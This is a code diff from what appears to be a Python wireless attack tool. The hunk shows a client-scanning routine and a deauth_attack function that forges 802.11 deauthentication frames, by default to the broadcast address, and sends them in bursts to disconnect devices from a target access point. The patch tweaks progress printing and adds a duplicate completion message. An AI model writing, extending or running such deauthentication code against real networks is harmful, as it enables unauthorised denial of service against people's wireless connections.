@@ -91,7 +91,6 @@ def scan_clients(target_bssid):
                 print(f"{Fore.CYAN}[+] Client: {client}, Vendor: {vendor}")
     sniff(iface=interface, timeout=scan_time, prn=packet_handler)
 
-
 def deauth_attack(target_bssid, client_bssid="FF:FF:FF:FF:FF:FF"):
     dot11 = Dot11(addr1=client_bssid, addr2=target_bssid, addr3=target_bssid)
     packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
@@ -101,9 +100,12 @@ def deauth_attack(target_bssid, client_bssid="FF:FF:FF:FF:FF:FF"):
         sendp(packet, inter=interval, count=burst, iface=interface, verbose=0)
         
         if (i // burst + 1) % 100 == 0:
-            print(f"{Fore.YELLOW}[+] Sent {(i // burst + 1) * burst} deauth packets so far...")
+            print(f"{Fore.YELLOW}[+] Sent {(i // burst + 1) * burst} deauth packets so far...", flush=True)
+
+    print(f"{Fore.GREEN}[+] Deauth attack complete.")
+
         
-        time.sleep(1)
+    time.sleep(1)
     
     print(f"{Fore.GREEN}[+] Deauth attack complete.")
 
